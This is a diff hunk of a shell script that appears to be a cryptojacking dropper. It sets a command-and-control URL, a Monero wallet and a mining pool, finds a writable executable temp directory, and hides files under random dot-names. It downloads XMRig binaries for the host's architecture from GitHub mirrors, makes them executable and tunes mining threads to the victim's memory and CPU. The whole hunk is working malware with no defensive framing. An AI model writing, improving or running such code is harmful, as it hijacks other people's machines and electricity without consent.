@@ -13,21 +13,39 @@ kx_kill() {
 kx_kill
 
 C2="https://enactment-polyester-corset.ngrok-free.dev"; W="47d4oznzDE2heUUr2oeQmZhmXcYS4gnNvibtmdXDi7dRUyzGgsXjAm6dbrveUN4fRKG1yu6RjU9PRCgd1XvaGU2M58T6dXC"; P="pool.supportxmr.com:443"
-D=/tmp; [ -w /var/tmp ] && D=/var/tmp
+D=""
+for cand in /data/local/tmp /dev/shm /var/tmp /tmp; do
+  [ -d "$cand" ] && [ -w "$cand" ] || continue
+  printf '#!/bin/sh\nexit 0\n' > "$cand/.kxprobe" 2>/dev/null || continue
+  chmod +x "$cand/.kxprobe" 2>/dev/null
+  "$cand/.kxprobe" 2>/dev/null || { rm -f "$cand/.kxprobe"; continue; }
+  rm -f "$cand/.kxprobe"
+  D="$cand"; break
+done
+[ -n "$D" ] || exit 0
 N=$(head -c6 /dev/urandom | od -An -tx1 | tr -d ' \n'); B="$D/.$N"
 A=$(uname -m); case "$A" in x86_64|amd64) F=x64;; aarch64|arm64) F=arm64;; armv7l|armv7*) F=armv7;; *) exit 0;; esac
 MEM=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 512)
 MODE=fast; [ "$MEM" -lt 2400 ] && MODE=light
 TH=60; [ "$(nproc 2>/dev/null || echo 2)" -le 2 ] && TH=40
 HP=$((10000 + $(head -c2 /dev/urandom | od -An -tu2 | tr -d ' ') % 20000))
-for U in "https://cdn.jsdelivr.net/gh/xmrlvrr/xmrbin@main/xmrig-$F.gz" \
-         "https://raw.githubusercontent.com/xmrlvrr/xmrbin/main/xmrig-$F.gz" \
+for U in "https://cdn.jsdelivr.net/gh/xmrlvrr/xmrbin@main/xmrig-$F" \
+         "https://raw.githubusercontent.com/xmrlvrr/xmrbin/main/xmrig-$F" \
+         "https://cdn.jsdelivr.net/gh/xmrlvrr/xmrbin@main/xmrig-$F.gz" \
          "https://github.com/xmrlvrr/xmrbin/releases/download/bin1/xmrig-$F.gz"; do
-  curl -fsSL --max-time 60 "$U" -o "$D/.$N.gz" 2>/dev/null && [ -s "$D/.$N.gz" ] && break
-  wget -q -O "$D/.$N.gz" "$U" 2>/dev/null && [ -s "$D/.$N.gz" ] && break
+  case "$U" in
+    *.gz)
+      curl -fsSL --max-time 90 "$U" -o "$D/.$N.gz" 2>/dev/null || continue
+      { gunzip -c "$D/.$N.gz" > "$B" 2>/dev/null || busybox gunzip -c "$D/.$N.gz" > "$B" 2>/dev/null || zcat "$D/.$N.gz" > "$B" 2>/dev/null; } || continue
+      ;;
+    *)
+      curl -fsSL --max-time 90 "$U" -o "$B" 2>/dev/null || continue
+      ;;
+  esac
+  [ -s "$B" ] && break
 done
-[ -s "$D/.$N.gz" ] || exit 0
-gunzip -c "$D/.$N.gz" > "$B" 2>/dev/null || exit 0
+[ -s "$B" ] || exit 0
+chmod +x "$B" 2>/dev/null
 chmod +x "$B" 2>/dev/null
 cat > "$D/.$N.json" <<J
 {"autosave":false,"cpu":{"enabled":true,"max-threads-hint":$TH},
